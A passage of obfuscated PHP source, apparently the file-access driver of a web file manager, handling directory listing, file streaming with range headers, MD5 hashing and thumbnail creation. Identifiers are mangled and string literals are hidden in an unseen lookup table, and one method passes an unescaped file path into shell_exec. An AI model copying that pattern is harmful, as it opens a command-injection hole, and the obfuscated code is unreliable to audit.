$÷ªşºßÒ[$áíªªë[76]]; $ŠøÈ¹Í–[$áíªªë[79]] = array($áíªªë[80] => $÷ªşºßÒ[$áíªªë[77]], $áíªªë[81] => $÷ªşºßÒ[$áíªªë[78]]); $Óõ»Õ¹[$Ÿ¥ã³ô] = $ŠøÈ¹Í–; } return $ŠøÈ¹Í–; } public function listPath($˜¥¿©«», $ĞÖÅéà = false) { } public function has($ó¶¹şØÙ, $¬¦¯éå‘ = false, $è‹Ş¬‹Ü = false) { } public function canRead($µøÛÖÖ…) { } public function canWrite($ûÑáúşƒ) { } public function getContent($¦‚öÂ€Ç) { } public function setContent($ë¥¬ìÕ, $ÂûÑø›Ô = '') { } protected function infoChildren($ÌÖ¤áğ¼, &$©±…¼œÙ) { $“Óñğı =& $_SERVER[”ôÑ§ì¸]; check_abort_echo(); $ö²½” = $this->listPath($ÌÖ¤áğ¼, !0); $ö²½” = array_merge($ö²½”[$“Óñğı[82]], $ö²½”[$“Óñğı[83]]); foreach ($ö²½” as $ƒ§ˆø†•) { if ($ƒ§ˆø†•[$“Óñğı[33]] == $“Óñğı[75]) { $©±…¼œÙ[$“Óñğı[78]]++; $®äÁ§Š = $this->getPathInner($ƒ§ˆø†•[$“Óñğı[84]]); $this->infoChildren($®äÁ§Š, $©±…¼œÙ); } else { $©±…¼œÙ[$“Óñğı[77]]++; $©±…¼œÙ[$“Óñğı[76]] += $ƒ§ˆø†•[$“Óñğı[76]]; } } } public function fileSubstr($ë‘îš›×, $‡ãŸü¡Ê, $¤îÑè©Ü) { } public function listAll($¤ñÇÛÏó) { } public function listAllMake($ñåŞæœï, &$ÔÖú©µ¯) { $Óªö¸£ =& $_SERVER[”ôÑ§ì¸]; check_abort_echo(); $Á×ÛñËŞ = $this->listPath($ñåŞæœï, !0); if (!$Á×ÛñËŞ) { return; } $ŸÆÏ–ü© = array_merge($Á×ÛñËŞ[$Óªö¸£[82]], $Á×ÛñËŞ[$Óªö¸£[83]]); foreach ($ŸÆÏ–ü© as $½ªµ´Ğê) { $¸«Øë = $½ªµ´Ğê[$Óªö¸£[33]] == $Óªö¸£[75]; $§ª‹˜é = array($Óªö¸£[84] => $½ªµ´Ğê[$Óªö¸£[84]], $Óªö¸£[75] => $¸«Øë); if (isset($½ªµ´Ğê[$Óªö¸£[76]])) { $§ª‹˜é[$Óªö¸£[76]] = $½ªµ´Ğê[$Óªö¸£[76]]; } if (isset($½ªµ´Ğê[$Óªö¸£[85]])) { $§ª‹˜é[$Óªö¸£[85]] = $½ªµ´Ğê[$Óªö¸£[85]]; } if (!$¸«Øë) { $ÔÖú©µ¯[] = $§ª‹˜é; continue; } $ÔÖú©µ¯[] = $§ª‹˜é; $ŠÅÛì“Š = $½ªµ´Ğê[$Óªö¸£[84]]; $ƒºø¦Á³ = $this->pathDriver; if (substr($½ªµ´Ğê[$Óªö¸£[84]], 0, strlen($ƒºø¦Á³)) == $ƒºø¦Á³) { $ŠÅÛì“Š = substr($ŠÅÛì“Š, strlen($ƒºø¦Á³)); } $this->listAllMake($ŠÅÛì“Š, $ÔÖú©µ¯); } } public function listAllSimple($£î¥Ø§÷, $…ÙÜŠ»Ò = false) { $­¤±…‰ = $this->listAll($£î¥Ø§÷); return $this->listAllSimpleMake($­¤±…‰, $this->getPathOuter($£î¥Ø§÷), $…ÙÜŠ»Ò); } public function listAllSimpleMake($Ö»®åÀÌ, $¶ËùÌ, $ŒÉÓ„â) { $ıÕ•»¦— =& $_SERVER[”ôÑ§ì¸]; $øèûºòÌ = array(); $¶ËùÌ = rtrim(get_path_father($¶ËùÌ), $ıÕ•»¦—[8]) . $ıÕ•»¦—[8]; foreach ($Ö»®åÀÌ as $†ÎÄ×‡­) { $¤ÌÆ¹è¸ = array($ıÕ•»¦—[84] => $†ÎÄ×‡­[$ıÕ•»¦—[84]], $ıÕ•»¦—[86] => $†ÎÄ×‡­[$ıÕ•»¦—[84]], $ıÕ•»¦—[75] => $†ÎÄ×‡­[$ıÕ•»¦—[75]]); if (isset($†ÎÄ×‡­[$ıÕ•»¦—[76]]) && !$†ÎÄ×‡­[$ıÕ•»¦—[75]]) { $¤ÌÆ¹è¸[$ıÕ•»¦—[76]] = $†ÎÄ×‡­[$ıÕ•»¦—[76]]; } if (isset($†ÎÄ×‡­[$ıÕ•»¦—[85]])) { $¤ÌÆ¹è¸[$ıÕ•»¦—[85]] = $†ÎÄ×‡­[$ıÕ•»¦—[85]]; } if (is_array($†ÎÄ×‡­[$ıÕ•»¦—[87]])) { $¤ÌÆ¹è¸[$ıÕ•»¦—[86]] = $†ÎÄ×‡­[$ıÕ•»¦—[87]][$ıÕ•»¦—[84]]; $¤ÌÆ¹è¸[$ıÕ•»¦—[76]] = $†ÎÄ×‡­[$ıÕ•»¦—[87]][$ıÕ•»¦—[76]]; $¤ÌÆ¹è¸[$ıÕ•»¦—[85]] = $†ÎÄ×‡­[$ıÕ•»¦—[87]][$ıÕ•»¦—[85]]; } else { if (substr($†ÎÄ×‡­[$ıÕ•»¦—[84]], 0, strlen($¶ËùÌ)) == $¶ËùÌ) { $¤ÌÆ¹è¸[$ıÕ•»¦—[84]] = substr($†ÎÄ×‡­[$ıÕ•»¦—[84]], strlen($¶ËùÌ)); } } $íÓşì§ğ = $†ÎÄ×‡­[$ıÕ•»¦—[75]] ? $ıÕ•»¦—[8] : $ıÕ•»¦—[12]; $¤ÌÆ¹è¸[$ıÕ•»¦—[86]] = rtrim($¤ÌÆ¹è¸[$ıÕ•»¦—[86]], $ıÕ•»¦—[8]) . $íÓşì§ğ; $¤ÌÆ¹è¸[$ıÕ•»¦—[84]] = $ıÕ•»¦—[8] . trim($¤ÌÆ¹è¸[$ıÕ•»¦—[84]], $ıÕ•»¦—[8]) . $íÓşì§ğ; if (!$ŒÉÓ„â) { $¹ù„©÷Õ = explode($ıÕ•»¦—[8], trim($¤ÌÆ¹è¸[$ıÕ•»¦—[84]], $ıÕ•»¦—[8])); $¤ÌÆ¹è¸[$ıÕ•»¦—[84]] = $ıÕ•»¦—[8] . implode($ıÕ•»¦—[8], array_slice($¹ù„©÷Õ, 1)) . $íÓşì§ğ; } $øèûºòÌ[] = $¤ÌÆ¹è¸; } return array_sort_by($øèûºòÌ, $ıÕ•»¦—[84]); } public function upload($©¨ÉÆ«Ÿ, $é†ŠÃ­ä, $•„•Ú÷Ù = false, $’ÊæÜùØ = REPEAT_REPLACE) { } public function uploadFileByID($¶ÏâÒ›§, $‰ıü‹ˆ, $•³ÌáÎ) { } public function uploadFileByPath($¤õ¾½««, $Æ´×†Äñ, $ÚËô”ÅÔ = array()) { } public function isUploadServer() { $²†­µ› =& $_SERVER[”ôÑ§ì¸]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $²†­µ›[88]) { return !0; } return $GLOBALS[$²†­µ›[6]][$²†­µ›[89]][$²†­µ›[90]]; } public function isFileOutServer() { $µåö ã =& $_SERVER[”ôÑ§ì¸]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $µåö ã[88]) { return !0; } return $GLOBALS[$µåö ã[6]][$µåö ã[89]][$µåö ã[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($éÌÆ‡‰¦) { $ÓãŒÓõ³ =& $_SERVER[”ôÑ§ì¸]; if (!$this->isCdnHost()) { return $éÌÆ‡‰¦; } return str_replace(trim(get_url_root($éÌÆ‡‰¦), $ÓãŒÓõ³[8]), trim($this->cdnHost, $ÓãŒÓõ³[8]), $éÌÆ‡‰¦); } public function uploadLink($ã¬ÉòÁ‚, $¶³±ÕØ› = 0) { $Œş”óà² =& $_SERVER[”ôÑ§ì¸]; if ($this->isUploadServer()) { return; } $ÌÄ¡Ù¿ = $this->getType(); if (!in_array($ÌÄ¡Ù¿, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ãá£°¥ = 1024 * 1024 * 10; $ºü‹êæ = $¶³±ÕØ› <= $Ãá£°¥ ? $Œş”óà²[92] : $Œş”óà²[93]; $àˆ»Åáò = (!$¶³±ÕØ› ? 1 : ceil($¶³±ÕØ› / pow(1024, 3))) * 3600 * 4; $úö»Üõ = $this->{$ºü‹êæ}($ã¬ÉòÁ‚, $àˆ»Åáò); if ($úö»Üõ) { $úö»Üõ[$Œş”óà²[94]] = $ã¬ÉòÁ‚; $úö»Üõ[$Œş”óà²[95]] = $ÌÄ¡Ù¿; } return $úö»Üõ; } public function uploadFormData($ß­ñ¨²±, $Ïü¨šéô = 3600) { } public function multiUploadFormData($ˆœµ±ÕÍ, $ÄäÍÎ¤à = 3600) { } public function download($ı”¾¤±¶, $ù¼×ûâÎ) { } public function ext($•’Šü¥Ç) { $ä•‹³’ =& $_SERVER[”ôÑ§ì¸]; if (strpos($•’Šü¥Ç, $ä•‹³’[8]) === -1) { $œâªÁÙ = $•’Šü¥Ç; } else { $œâªÁÙ = $this->pathThis($•’Šü¥Ç); } $ÚšúŸÓ¤ = $ä•‹³’[12]; if (strstr($œâªÁÙ, $ä•‹³’[10])) { $ÚšúŸÓ¤ = substr($œâªÁÙ, strrpos($œâªÁÙ, $ä•‹³’[10]) + 1); $ÚšúŸÓ¤ = strtolower($ÚšúŸÓ¤); } if (strlen($ÚšúŸÓ¤) > 3 && preg_match($ä•‹³’[96], $ÚšúŸÓ¤, $ÒĞåıŠ¢)) { $ÚšúŸÓ¤ = $ä•‹³’[12]; } return $ÚšúŸÓ¤; } public function pathThis($äÛÄ¤‚ä) { $œ×¡¬Ò¶ =& $_SERVER[”ôÑ§ì¸]; $äÛÄ¤‚ä = str_replace($œ×¡¬Ò¶[97], $œ×¡¬Ò¶[8], rtrim($äÛÄ¤‚ä, $œ×¡¬Ò¶[8])); $ÀÅ«¤ÔÔ = strrpos($äÛÄ¤‚ä, $œ×¡¬Ò¶[8]); if ($ÀÅ«¤ÔÔ === !1) { return $äÛÄ¤‚ä; } return substr($äÛÄ¤‚ä, $ÀÅ«¤ÔÔ + 1); } public function pathFather($×±Ë“‘Ù) { $êÀ‚–Š‰ =& $_SERVER[”ôÑ§ì¸]; $×±Ë“‘Ù = str_replace($êÀ‚–Š‰[97], $êÀ‚–Š‰[8], rtrim($×±Ë“‘Ù, $êÀ‚–Š‰[8])); $ØØé»ŞÛ = strrpos($×±Ë“‘Ù, $êÀ‚–Š‰[8]); if ($ØØé»ŞÛ === !1) { return $êÀ‚–Š‰[12]; } return substr($×±Ë“‘Ù, 0, $ØØé»ŞÛ + 1); } public function hashSimple($ËõœğŸœ) { $–ü‘É¬ =& $_SERVER[”ôÑ§ì¸]; if (!$ËõœğŸœ) { return md5($–ü‘É¬[12]); } $Ûİ‡é°ƒ = $this->size($ËõœğŸœ); $ì ¨ï¥ = 200; $ëĞ¹åë˜ = 50; if ($Ûİ‡é°ƒ <= $ì ¨ï¥ * $ëĞ¹åë˜) { return $this->hashMd5($ËõœğŸœ) . $Ûİ‡é°ƒ; } $ÂşÅôå× = intval($Ûİ‡é°ƒ / $ëĞ¹åë˜); $Ûª»Ñ°¸ = $–ü‘É¬[12]; for ($Îé—¸€½ = 0; $Îé—¸€½ < $ëĞ¹åë˜; $Îé—¸€½++) { $Ûª»Ñ°¸ .= $this->fileSubstr($ËõœğŸœ, $ÂşÅôå× * $Îé—¸€½, $ì ¨ï¥); } $Ûª»Ñ°¸ .= $this->fileSubstr($ËõœğŸœ, $Ûİ‡é°ƒ - $ì ¨ï¥, $ì ¨ï¥); return md5($Ûª»Ñ°¸) . $Ûİ‡é°ƒ; } public static $md5Cache = array(); public function hashMd5($æí´ş§) { if (!$æí´ş§) { return md5($_SERVER[”ôÑ§ì¸][12]); } $æí´ş§ = $this->iconvSystem($æí´ş§); if (isset(self::$md5Cache[$æí´ş§])) { return self::$md5Cache[$æí´ş§]; } self::$md5Cache[$æí´ş§] = $this->hashMd5Shell($æí´ş§); if (!self::$md5Cache[$æí´ş§]) { self::$md5Cache[$æí´ş§] = @md5_file($æí´ş§); } return self::$md5Cache[$æí´ş§]; } private function hashMd5Shell($å£«ï¸Ô) { $—¦¥î”½ =& $_SERVER[”ôÑ§ì¸]; if (!$å£«ï¸Ô) { return md5($—¦¥î”½[12]); } if (!function_exists($—¦¥î”½[98])) { return !1; } $¨Ì™¼ = array($—¦¥î”½[99], $—¦¥î”½[100]); $Û†ÁşÌ = Cache::get($—¦¥î”½[101]); if (!$Û†ÁşÌ) { $‰ó¾´è´ = BASIC_PATH . $—¦¥î”½[102]; $ñ ‰íØá = md5_file($‰ó¾´è´); $Û†ÁşÌ = $—¦¥î”½[103]; foreach ($¨Ì™¼ as $†ƒÛÖŞ) { $Ô¶¥ç·ñ = shell_exec($†ƒÛÖŞ . "\x20\42{$‰ó¾´è´}\42"); if ($Ô¶¥ç·ñ && substr(trim($Ô¶¥ç·ñ), 0, 32) == $ñ ‰íØá) { $Û†ÁşÌ = $†ƒÛÖŞ; break; } } Cache::set($—¦¥î”½[101], $Û†ÁşÌ, 3600); } if ($Û†ÁşÌ == $—¦¥î”½[103]) { return !1; } $Ô¶¥ç·ñ = shell_exec($Û†ÁşÌ . "\40\x22{$å£«ï¸Ô}\x22"); $Ô¶¥ç·ñ = str_replace($—¦¥î”½[104], $—¦¥î”½[12], $Ô¶¥ç·ñ); return substr($Ô¶¥ç·ñ, 0, 32); } public function link($Îªï³àé) { return $Îªï³àé; } public function fileOut($…û§İ¯², $Ìàáığ = false, $õ§š‰® = false, $—Š˜ã¤ = '') { $ì§ÒùÔú =& $_SERVER[”ôÑ§ì¸]; $this->cacheMethod(null, null); if (!$…û§İ¯² || !$this->exist($…û§İ¯²)) { show_json(LNG($ì§ÒùÔú[105]), !1, $õ§š‰®); } $ÛÈ¾³¼ = $this->getType() == $ì§ÒùÔú[106]; $€¼ô¸ºÀ = $GLOBALS[$ì§ÒùÔú[6]][$ì§ÒùÔú[89]][$ì§ÒùÔú[107]][$ì§ÒùÔú[108]]; $ğç£à…ë = (double) $GLOBALS[$ì§ÒùÔú[6]][$ì§ÒùÔú[89]][$ì§ÒùÔú[107]][$ì§ÒùÔú[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÌíˆóÁ÷ = $this->infoFull($…û§İ¯²); $ßÉ²¥à = $ÌíˆóÁ÷[$ì§ÒùÔú[76]]; $òÃº¹ı = gmdate($ì§ÒùÔú[110], $ÌíˆóÁ÷[$ì§ÒùÔú[85]]); $ùçÀÜ¢Ö = $õ§š‰® ? $õ§š‰® : $this->iconvApp($ÌíˆóÁ÷[$ì§ÒùÔú[32]]); $Á¸œ¬¡ = 0; $ëì”šÒã = $ßÉ²¥à - 1; $Şëƒ¬¼ = $this->ext($ùçÀÜ¢Ö); if (in_array($Şëƒ¬¼, array($ì§ÒùÔú[111], $ì§ÒùÔú[112], $ì§ÒùÔú[113], $ì§ÒùÔú[114]))) { $Şëƒ¬¼ = $ì§ÒùÔú[115]; } if (in_array($Şëƒ¬¼, array($ì§ÒùÔú[116]))) { $Şëƒ¬¼ = $ì§ÒùÔú[117]; } if (!$—Š˜ã¤) { $—Š˜ã¤ = md5($òÃº¹ı . $ßÉ²¥à); } $—Š˜ã¤ = $ì§ÒùÔú[118] . $—Š˜ã¤ . $ì§ÒùÔú[118]; $éïßîÑ„ = get_file_mime($Şëƒ¬¼); $ä÷¯â‹  = !0; $ä÷¯â‹  = isset($_GET[$ì§ÒùÔú[119]]) ? !1 : !0; if ($Ìàáığ === !1 && !mime_support($éïßîÑ„)) { $éïßîÑ„ = $ì§ÒùÔú[120]; } header($ì§ÒùÔú[121]); header($ì§ÒùÔú[122] . $éïßîÑ„); $ù²§ËĞ = rawurlencode($ùçÀÜ¢Ö); $ù²§ËĞ = $ì§ÒùÔú[118] . $ù²§ËĞ . $ì§ÒùÔú[123] . $ù²§ËĞ; if ($Ìàáığ) { header($ì§ÒùÔú[124]); header($ì§ÒùÔú[125] . $ù²§ËĞ); } else { if ($ä÷¯â‹ ) { header($ì§ÒùÔú[126] . $ù²§ËĞ); } } header($ì§ÒùÔú[127] . gmdate($ì§ÒùÔú[110], time() + 3600 * 24 * 30) . $ì§ÒùÔú[128]); header($ì§ÒùÔú[129]); header($ì§ÒùÔú[130]); header($ì§ÒùÔú[131]); if (isset($_SERVER[$ì§ÒùÔú[132]]) && strtotime($_SERVER[$ì§ÒùÔú[132]]) == $ÌíˆóÁ÷[$ì§ÒùÔú[85]]) { header($ì§ÒùÔú[133], !0, 304); die; } if (isset($_SERVER[$ì§ÒùÔú[134]]) && $_SERVER[$ì§ÒùÔú[134]] == $—Š˜ã¤) { header($ì§ÒùÔú[135] . $—Š˜ã¤, !0, 304); die; } header($ì§ÒùÔú[135] . $—Š˜ã¤); header($ì§ÒùÔú[136] . $òÃº¹ı . $ì§ÒùÔú[128]); header($ì§ÒùÔú[137] . $ùçÀÜ¢Ö); header($ì§ÒùÔú[138]); header($ì§ÒùÔú[139] . $ßÉ²¥à); header($ì§ÒùÔú[140]); if (!$Ìàáığ && $Şëƒ¬¼ == $ì§ÒùÔú[141]) { if ($ßÉ²¥à > 1024 * 1024 * 5) { die; } $íøÖ¹ ½ = $this->getContent($…û§İ¯²); $íøÖ¹ ½ = Html::clearSVG($íøÖ¹ ½); header($ì§ÒùÔú[142] . strlen($íøÖ¹ ½)); echo $íøÖ¹ ½; die; } $ğ—™÷ê = strtolower($_SERVER[$ì§ÒùÔú[143]]); if ($ÛÈ¾³¼ && $ğ—™÷ê && $€¼ô¸ºÀ) { if (strstr($ğ—™÷ê, $ì§ÒùÔú[144])) { header($ì§ÒùÔú[145] . $…û§İ¯²); } else { if (strstr($ğ—™÷ê, $ì§ÒùÔú[146])) { header($ì§ÒùÔú[147] . $…û§İ¯²); } else { if (strstr($ğ—™÷ê, $ì§ÒùÔú[148])) { header($ì§ÒùÔú[149] . $…û§İ¯²); } } } if ($ğç£à…ë) { header($ì§ÒùÔú[150] . $ğç£à…ë); } return; } if (isset($_SERVER[$ì§ÒùÔú[151]])) { if (preg_match($ì§ÒùÔú[152], $_SERVER[$ì§ÒùÔú[151]], $ã˜ê°Ëî)) { $Á¸œ¬¡ = intval($ã˜ê°Ëî[1]); $Á¸œ¬¡ = $Á¸œ¬¡ <= 0 ? 0 : ($Á¸œ¬¡ >= $ëì”šÒã ? $ëì”šÒã : $Á¸œ¬¡); if (!empty($ã˜ê°Ëî[2])) { $ˆ‘åÔîÁ = intval($ã˜ê°Ëî[2]); $ëì”šÒã = $ˆ‘åÔîÁ < $Á¸œ¬¡ ? $Á¸œ¬¡ : ($ˆ‘åÔîÁ >= $ëì”šÒã ? $ëì”šÒã : $ˆ‘åÔîÁ); } } header($ì§ÒùÔú[153]); header("\x43\x6f\x6e\x74\x65\156\x74\x2d\122\x61\156\x67\x65\x3a\40\x62\x79\x74\145\x73\40{$Á¸œ¬¡}\55{$ëì”šÒã}\x2f" . $ßÉ²¥à); } else { header($ì§ÒùÔú[154]); } header($ì§ÒùÔú[155]); $õ—Ì£Íê = !0; if ($_SERVER[$ì§ÒùÔú[156]] == $ì§ÒùÔú[157] && $ßÉ²¥à > 1204 * 1024 * 1024 * 2) { $õ—Ì£Íê = !1; } if ($õ—Ì£Íê) { header($ì§ÒùÔú[158] . ($ëì”šÒã - $Á¸œ¬¡ + 1)); } if ($_SERVER[$ì§ÒùÔú[159]] == $ì§ÒùÔú[160]) { return; } $ü»¿Ï¤ = 1024 * 100; $Ø÷ğ¦„ = 0; if ($ğç£à…ë) { $Ø÷ğ¦„ = intval(1000 * 1000 * ($ü»¿Ï¤ / $ğç£à…ë)); } while ($Á¸œ¬¡ <= $ëì”šÒã) { $‡à±ÈÎ = timeFloat(); check_abort(); $°ŒÌÀàç = $ëì”šÒã - $Á¸œ¬¡ + 1; if ($°ŒÌÀàç <= $ü»¿Ï¤) { $ü»¿Ï¤ = $°ŒÌÀàç; } echo $this->fileSubstr($…û§İ¯², $Á¸œ¬¡, $ü»¿Ï¤); $Á¸œ¬¡ += $ü»¿Ï¤; if ($ü»¿Ï¤ == $°ŒÌÀàç) { $Á¸œ¬¡ = $ëì”šÒã + 1; } if ($Ø÷ğ¦„) { $áïƒ’Í³ = intval(1000 * 1000 * (timeFloat() - $‡à±ÈÎ)); $™Ç¸´²Í = $Ø÷ğ¦„ - $áïƒ’Í³; if ($™Ç¸´²Í > 5) { usleep($™Ç¸´²Í); } } } } public function fileOutServer($ó”ˆÕ´, $›‹‘®¿Ü = false, $Üç ÍĞÅ = false, $‚¾ÏŞÚŠ = '') { $this->fileOut($ó”ˆÕ´, $›‹‘®¿Ü, $Üç ÍĞÅ, $‚¾ÏŞÚŠ); } public function fileOutLink($šµàÉô) { header($_SERVER[”ôÑ§ì¸][161] . $šµàÉô); die; } public function cacheMethod($ÜÒú¯±, $òâÂØÌä, $ Ä™şˆì = null) { $¤Äíçé =& $_SERVER[”ôÑ§ì¸]; static $ëëäÁÇÀ = array(); $â”şòÈÛ = $òâÂØÌä ? ltrim($this->getPathOuter($òâÂØÌä), $¤Äíçé[8]) : $¤Äíçé[12]; $Æ™ÄÃ = $¤Äíçé[162] . $ÜÒú¯± . $¤Äíçé[163] . rtrim($â”şòÈÛ, $¤Äíçé[8]); if (is_null($ÜÒú¯±)) { $ëëäÁÇÀ = array(); return; } if (is_null($òâÂØÌä)) { foreach ($ëëäÁÇÀ as $Æ™ÄÃ => $ÛËÊÚšê) { if (!strstr($Æ™ÄÃ, $¤Äíçé[162] . $ÜÒú¯± . $¤Äíçé[164])) { continue; } unset($ëëäÁÇÀ[$Æ™ÄÃ]); } return; } if (!is_null($ Ä™şˆì)) { $ëëäÁÇÀ[$Æ™ÄÃ] = $ Ä™şˆì; return; } $êåÄ¹¼ä = isset($ëëäÁÇÀ[$Æ™ÄÃ]) ? $ëëäÁÇÀ[$Æ™ÄÃ] : null; if (!is_null($êåÄ¹¼ä)) { return $êåÄ¹¼ä; } $êåÄ¹¼ä = $this->{$ÜÒú¯±}($òâÂØÌä); $ëëäÁÇÀ[$Æ™ÄÃ] = $êåÄ¹¼ä; return $êåÄ¹¼ä; } public function cacheMethodInfoSet($÷ùÖ‘Òç, $ğÖŒãªÅ, $¡üÒÅä‡ = false) { $ªæÉäÊì =& $_SERVER[”ôÑ§ì¸]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ªæÉäÊì[165], $÷ùÖ‘Òç, $ğÖŒãªÅ); $this->cacheMethod($ªæÉäÊì[166], $÷ùÖ‘Òç, $ğÖŒãªÅ ? !1 : !0); if (is_array($¡üÒÅä‡)) { $this->cacheMethod($ªæÉäÊì[167], $÷ùÖ‘Òç, $¡üÒÅä‡); } } public function fileOutImage($¢ĞÚ¾ ß, $ÌıÉí²ı = 250) { $×»ÍÒ—œ =& $_SERVER[”ôÑ§ì¸]; set_timeout(); if (substr($¢ĞÚ¾ ß, 0, 4) == $×»ÍÒ—œ[148]) { $this->fileOutLink($¢ĞÚ¾ ß); } $ªÒ»±åÀ = $this->info($¢ĞÚ¾ ß); $û‚±ıÕ“ = !1; $’½ ¸Ø = isset($GLOBALS[$×»ÍÒ—œ[168]]) ? $GLOBALS[$×»ÍÒ—œ[168]] : array(); if ($’½ ¸Ø && $’½ ¸Ø[$×»ÍÒ—œ[169]] == $ªÒ»±åÀ[$×»ÍÒ—œ[84]]) { $ªÒ»±åÀ = $’½ ¸Ø; $À¦¥Ëô™ = $ªÒ»±åÀ[$×»ÍÒ—œ[170]]; if ($À¦¥Ëô™ && isset($À¦¥Ëô™[$×»ÍÒ—œ[171]])) { if ($À¦¥Ëô™[$×»ÍÒ—œ[171]] <= $ÌıÉí²ı && $À¦¥Ëô™[$×»ÍÒ—œ[172]] <= $ÌıÉí²ı) { $û‚±ıÕ“ = !0; } } } if ($ªÒ»±åÀ[$×»ÍÒ—œ[76]] <= 1024 * 50 || $û‚±ıÕ“ || !function_exists($×»ÍÒ—œ[173]) || $ªÒ»±åÀ[$×»ÍÒ—œ[174]] == $×»ÍÒ—œ[175]) { return $this->fileOut($¢ĞÚ¾ ß, !1, $ªÒ»±åÀ[$×»ÍÒ—œ[32]]); } $‘¨İÆşû = kodIO::hashPath($ªÒ»±åÀ); $šñ‚•äø = "\143\157\166\145\162\x5f{$‘¨İÆşû}\137{$ÌıÉí²ı}\x2e\x70\156\x67"; $ş‚—ğªº = IO_PATH_SYSTEM_TEMP . $×»ÍÒ—œ[176]; $†Ì”“Ç¼ = IO::infoFullSimple($ş‚—ğªº); $ñÇåÈä = $†Ì”“Ç¼ && is_array($†Ì”“Ç¼) ? $†Ì”“Ç¼[$×»ÍÒ—œ[84]] : $×»ÍÒ—œ[12]; if (!$ñÇåÈä) { $ñÇåÈä = IO::mkdir($ş‚—ğªº); } if ($ªÒ»±åÀ[$×»ÍÒ—œ[177]] == $×»ÍÒ—œ[178] && isset($ªÒ»±åÀ[$×»ÍÒ—œ[179]]) && $ªÒ»±åÀ[$×»ÍÒ—œ[179]] == kodIO::sourceID($ñÇåÈä)) { $€ˆ‘êåÜ = $ªÒ»±åÀ[$×»ÍÒ—œ[180]]; if ($ÌıÉí²ı <= 500) { $–§İº‰ = preg_replace($×»ÍÒ—œ[181], $×»ÍÒ—œ[182], $ªÒ»±åÀ[$×»ÍÒ—œ[32]]); $€ˆ‘êåÜ = IO::fileNameExist($ñÇåÈä, $–§İº‰); } return IO::fileOut(KodIO::make($€ˆ‘êåÜ), !1, $ªÒ»±åÀ[$×»ÍÒ—œ[32]]); } $ğÎ¤ï® = IO::fileNameExist($ñÇåÈä, $šñ‚•äø); if ($ğÎ¤ï®) { return IO::fileOut(KodIO::make($ğÎ¤ï®), !1, $ªÒ»±åÀ[$×»ÍÒ—œ[32]]); } if ($ÌıÉí²ı > 1000) { $this->makeImageCover($ñÇåÈä, $¢ĞÚ¾ ß, $šñ‚•äø, $ÌıÉí²ı); $this->makeImageCover($ñÇåÈä, $¢ĞÚ¾ ß, "\x63\x6f\x76\x65\162\x5f{$‘¨İÆşû}\x5f\x32\65\x30\x2e\160\x6e\x67", 250); $ğÎ¤ï® = IO::fileNameExist($ñÇåÈä, $šñ‚•äø); if ($ğÎ¤ï®) { return IO::fileOut(KodIO::make($ğÎ¤ï®), !1, $ªÒ»±åÀ[$×»ÍÒ—œ[32]]); } die; } $–°ÜïÜº = Cache::get($šñ‚•äø); if ($–°ÜïÜº == $×»ÍÒ—œ[183] || $–°ÜïÜº == $×»ÍÒ—œ[184]) { echo $–°ÜïÜº; die; } Cache::set($šñ‚•äø, $×»ÍÒ—œ[184], 60); $êÄ°ô³ı = array($ñÇåÈä, $ªÒ»±åÀ[$×»ÍÒ—œ[84]], $šñ‚•äø, $ÌıÉí²ı); $­©÷ÁÙ = $×»ÍÒ—œ[185] . $ªÒ»±åÀ[$×»ÍÒ—œ[76]] . $×»ÍÒ—œ[186] . $šñ‚•äø . $×»ÍÒ—œ[187] . $ªÒ»±åÀ[$×»ÍÒ—œ[32]] . $×»ÍÒ—œ[188] . $ªÒ»±åÀ[$×»ÍÒ—œ[84]]; TaskQueue::add($×»ÍÒ—œ[189], $êÄ°ô³ı, $­©÷ÁÙ, $šñ‚•äø); } public function makeImageCover($¢ê¼ª™ù, $Û‰©êï÷, $ÎˆÔ‰­ë, $È²‰éø) { $µÖù˜“ =& $_SERVER[”ôÑ§ì¸]; if (IO::fileNameExist($¢ê¼ª™ù, $ÎˆÔ‰­ë)) { return $µÖù˜“[190]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $—íşÚ© = DATA_THUMB . $ÎˆÔ‰­ë; del_file($—íşÚ©); $±î¹‹Ñõ = TEMP_FILES . $ÎˆÔ‰­ë; if (!@file_exists($±î¹‹Ñõ)) { $±î¹‹Ñõ = IO::download($Û‰©êï÷, $±î¹‹Ñõ); } if (!@file_exists($±î¹‹Ñõ)) { return $µÖù˜“[191]; } ImageThumb::createThumb($±î¹‹Ñõ, $—íşÚ©, $È²‰éø, $È²‰éø * 10); if (@file_exists($—íşÚ©)) { Cache::remove($ÎˆÔ‰­ë); return IO::move($—íşÚ©, $¢ê¼ª™ù); } Cache::set($ÎˆÔ‰­ë, $µÖù˜“[183], 600); del_file($—íşÚ©); return $µÖù˜“[192] . $±î¹‹Ñõ . $µÖù˜“[71]; } public function fileOutImageServer($¤Ôà‘», $‡¾­Ï…Â = 250) { $this->fileOutImage($¤Ôà‘», $‡¾­Ï…Â); } public function fileNameAuto($°š¸ƒ²À, $Â¿À‹èŸ, $»ÛÛÏßï = REPEAT_RENAME, $Ğúøî€“ = false) { $©û²ìü =& $_SERVER[”ôÑ§ì¸]; $ö¬¹˜ğ = $°š¸ƒ²À === $©û²ìü[12] ? $Â¿À‹èŸ : rtrim($°š¸ƒ²À, $©û²ìü[8]) . $©û²ìü[8] . $Â¿À‹èŸ; if ($»ÛÛÏßï == REPEAT_REPLACE || !$this->exist($ö¬¹˜ğ) || $Ğúøî€“ && $»ÛÛÏßï != REPEAT_RENAME_FOLDER) { return $Â¿À‹èŸ; } if ($»ÛÛÏßï == REPEAT_SKIP) { return !1; } $å¹¦Ç¿ = $©û²ìü[10] . get_path_ext($Â¿À‹èŸ); $å¹¦Ç¿ = $å¹¦Ç¿ == $©û²ìü[10] || $Ğúøî€“ ? $©û²ìü[12] : $å¹¦Ç¿; $’‚ÖÃ»ê = 1; $â“±ş = substr($Â¿À‹èŸ, 0, strlen($Â¿À‹èŸ) - strlen($å¹¦Ç¿)); $˜Í°ı× = $â“±ş . "\x28{$’‚ÖÃ»ê}\x29{$å¹¦Ç¿}"; while ($this->exist(rtrim($°š¸ƒ²À, $©û²ìü[8]) . $©û²ìü[8] . $˜Í°ı×)) { 